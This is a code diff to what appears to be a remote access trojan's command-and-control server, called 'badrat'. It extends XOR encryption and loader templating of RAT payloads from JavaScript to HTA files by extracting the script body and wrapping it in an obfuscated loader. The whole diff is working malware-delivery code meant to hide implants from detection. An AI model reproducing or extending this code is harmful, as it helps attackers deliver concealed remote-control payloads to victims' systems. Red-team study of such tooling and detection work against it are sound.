@@ -164,7 +164,7 @@ def pretty_print_banner():
     $$ |  $$ | $$$$$$$ |$$ /  $$ |$$ |  \__| $$$$$$$ |  $$ |    \$$$$$$\        (    / _/    /' o O| ,_( ))___     (`
     $$ |  $$ |$$  __$$ |$$ |  $$ |$$ |      $$  __$$ |  $$ |$$\  \____$$\        ` -|   )_  /o_O_'_(  \\'    _ `\    )
     $$$$$$$  |\$$$$$$$ |\$$$$$$$ |$$ |      \$$$$$$$ |  \$$$$  |$$$$$$$  |          `"\"\"\"`            =`---<___/---'
-    \_______/  \_______| \_______|\__|       \_______|   \____/ \_______/  v1.6.6 eKirmani eKript          "`
+    \_______/  \_______| \_______|\__|       \_______|   \____/ \_______/  v1.6.7 eKirmani eKript JS+HTA   "`
     """
     pretty_print(banner)
 
@@ -251,10 +251,17 @@ def send_ratcode(ratID=None, ratType=None, ip_addr=None):
             fd = open(os.getcwd() + "/rats/badrat." + ratType, 'rb')
             ratcode = fd.read()
 
-            # Added ratcode xor encryption for js payloads only -- see resources/ekript.py
+            # Added ratcode xor encryption for js and hta payloads only -- see resources/ekript.py
             if(not no_payload_encryption and ratType == "js"):
                 key = ekript.gen_key()
-                ratcode = ekript.make_loader_template(ekript.ekript_js(ratcode, key), key)
+                ratcode = ekript.make_js_loader_template(ekript.ekript_js(ratcode, key), key)
+
+            if(not no_payload_encryption and ratType == "hta"):
+                key = ekript.gen_key()
+                # In the case of a JS file the JS source is just the entire file...
+                # For HTA's the JS source is everything between the <script> </script> tags
+                js_source = ratcode.split(b"<script>")[1].split(b"</script>")[0]
+                ratcode = ekript.make_hta_loader_template(ekript.ekript_js(js_source, key), key, ratcode)
 
         except e:
             pretty_print("[-] Error sending ad-hoc ratcode: No such rat exists: /rats/badrat." + ratType)
